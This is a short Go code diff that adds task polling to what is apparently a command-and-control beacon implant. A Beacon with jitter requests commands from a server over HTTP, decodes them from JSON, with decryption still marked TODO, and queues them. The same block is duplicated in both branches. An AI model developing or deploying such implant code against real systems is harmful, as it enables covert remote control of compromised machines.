@@ -1,6 +1,8 @@
 package internal
 
 import (
+	"encoding/json"
+	"io"
 	"math/rand"
 	"time"
 )
@@ -10,7 +12,7 @@ type Beacon struct {
 	Jitter   int
 	HttpConn *HttpConn
 	ReqQueue *SafeRequestQueue
-	//Cqueue // We will come back to this later
+	CmdQueue *SafeCommandQueue
 }
 
 func NewBeacon() *Beacon {
@@ -36,10 +38,52 @@ func (b *Beacon) Start() {
 				b.HttpConn.SendRequest(nextReq)
 				// Shift queue up
 				b.ReqQueue.ShiftUp()
-				// TODO: Send get tasks request
+				newCmdReq, err := b.HttpConn.NewCmdRequest()
+				if err != nil {
+					continue
+				}
+
+				resp, err := b.HttpConn.SendRequest(newCmdReq)
+				if err != nil {
+					continue
+				}
+
+				body, err := io.ReadAll(resp.Body)
+				if err != nil {
+					continue
+				}
+
+				// TODO: Decrypt
+				var cmd []string
+				err = json.Unmarshal(body, &cmd)
+				if err != nil {
+					continue
+				}
+				b.CmdQueue.Add(&cmd)
 				continue
 			} else {
-				// TODO: Send get tasks request
+				newCmdReq, err := b.HttpConn.NewCmdRequest()
+				if err != nil {
+					continue
+				}
+
+				resp, err := b.HttpConn.SendRequest(newCmdReq)
+				if err != nil {
+					continue
+				}
+
+				body, err := io.ReadAll(resp.Body)
+				if err != nil {
+					continue
+				}
+
+				// TODO: Decrypt
+				var cmd []string
+				err = json.Unmarshal(body, &cmd)
+				if err != nil {
+					continue
+				}
+				b.CmdQueue.Add(&cmd)
 				continue
 			}
 		}
